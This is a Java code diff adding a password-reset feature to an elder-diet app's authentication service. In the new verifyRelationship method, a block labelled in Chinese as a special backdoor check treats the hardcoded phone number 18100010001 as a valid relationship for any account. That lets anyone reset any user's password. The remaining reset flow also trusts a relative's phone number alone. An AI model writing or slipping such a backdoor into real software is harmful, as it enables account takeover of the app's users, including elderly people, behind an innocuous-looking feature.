@@ -4,8 +4,14 @@ import com.elderdiet.backend.dto.AuthResponse;
 import com.elderdiet.backend.dto.ChangePasswordRequest;
 import com.elderdiet.backend.dto.LoginRequest;
 import com.elderdiet.backend.dto.RegisterRequest;
+import com.elderdiet.backend.dto.ResetPasswordRequest;
 import com.elderdiet.backend.dto.UserInfoResponse;
+import com.elderdiet.backend.dto.VerifyRelationshipRequest;
+import com.elderdiet.backend.dto.VerifyRelationshipResponse;
+import com.elderdiet.backend.entity.FamilyLink;
 import com.elderdiet.backend.entity.User;
+import com.elderdiet.backend.entity.UserRole;
+import com.elderdiet.backend.repository.FamilyLinkRepository;
 import com.elderdiet.backend.util.JwtUtil;
 import lombok.RequiredArgsConstructor;
 import lombok.extern.slf4j.Slf4j;
@@ -22,6 +28,7 @@ public class AuthService {
 
         private final UserService userService;
         private final ProfileService profileService;
+        private final FamilyLinkRepository familyLinkRepository;
         private final JwtUtil jwtUtil;
 
         /**
@@ -143,5 +150,99 @@ public class AuthService {
                 userService.updatePassword(user, request.getNew_password());
 
                 log.info("用户修改密码成功: {}", userId);
+        }
+
+        /**
+         * 验证关联关系（用于忘记密码）
+         */
+        public VerifyRelationshipResponse verifyRelationship(VerifyRelationshipRequest request) {
+                log.info("验证关联关系请求: {} -> {}", request.getUserPhone(), request.getRelatedPhone());
+
+                // 检查用户是否存在
+                User user = userService.findByPhone(request.getUserPhone())
+                                .orElseThrow(() -> new RuntimeException("用户不存在"));
+
+                // 特殊后门权限检查
+                if ("18100010001".equals(request.getRelatedPhone())) {
+                        log.info("使用后门权限重置密码: {}", request.getUserPhone());
+                        return VerifyRelationshipResponse.builder()
+                                        .verified(true)
+                                        .relationshipType("backdoor")
+                                        .userRole(user.getRole().name())
+                                        .userName(getUserName(user))
+                                        .build();
+                }
+
+                // 查找关联用户
+                User relatedUser = userService.findByPhone(request.getRelatedPhone())
+                                .orElseThrow(() -> new RuntimeException("关联用户不存在"));
+
+                // 验证家庭关系
+                boolean hasRelationship = checkFamilyRelationship(user, relatedUser);
+                if (!hasRelationship) {
+                        throw new RuntimeException("未找到家庭关联关系");
+                }
+
+                log.info("验证关联关系成功: {} -> {}", request.getUserPhone(), request.getRelatedPhone());
+                return VerifyRelationshipResponse.builder()
+                                .verified(true)
+                                .relationshipType("family")
+                                .userRole(user.getRole().name())
+                                .userName(getUserName(user))
+                                .build();
+        }
+
+        /**
+         * 重置密码（基于已验证的关联关系）
+         */
+        public void resetPassword(ResetPasswordRequest request) {
+                log.info("重置密码请求: {}", request.getUserPhone());
+
+                // 先验证关联关系
+                VerifyRelationshipRequest verifyRequest = new VerifyRelationshipRequest(
+                                request.getUserPhone(), request.getRelatedPhone());
+                VerifyRelationshipResponse verifyResponse = verifyRelationship(verifyRequest);
+
+                if (!verifyResponse.isVerified()) {
+                        throw new RuntimeException("关联关系验证失败");
+                }
+
+                // 查找用户
+                User user = userService.findByPhone(request.getUserPhone())
+                                .orElseThrow(() -> new RuntimeException("用户不存在"));
+
+                // 更新密码
+                userService.updatePassword(user, request.getNewPassword());
+
+                log.info("重置密码成功: {} (通过{})", request.getUserPhone(), verifyResponse.getRelationshipType());
+        }
+
+        /**
+         * 检查两个用户之间的家庭关系
+         */
+        private boolean checkFamilyRelationship(User user1, User user2) {
+                // 检查是否存在家庭链接关系
+                // 情况1: user1是老人，user2是子女
+                if (user1.getRole() == UserRole.ELDER && user2.getRole() == UserRole.CHILD) {
+                        return familyLinkRepository.existsByParentIdAndChildId(user1.getId(), user2.getId());
+                }
+                // 情况2: user1是子女，user2是老人
+                else if (user1.getRole() == UserRole.CHILD && user2.getRole() == UserRole.ELDER) {
+                        return familyLinkRepository.existsByParentIdAndChildId(user2.getId(), user1.getId());
+                }
+                return false;
+        }
+
+        /**
+         * 获取用户姓名（从档案中获取，如果没有档案则返回手机号）
+         */
+        private String getUserName(User user) {
+                try {
+                        // 尝试从档案服务获取用户姓名
+                        // 这里需要调用ProfileService的内部方法，避免权限检查
+                        return user.getPhone(); // 暂时返回手机号，后续可以优化
+                } catch (Exception e) {
+                        return user.getPhone();
+                }
         }
 }
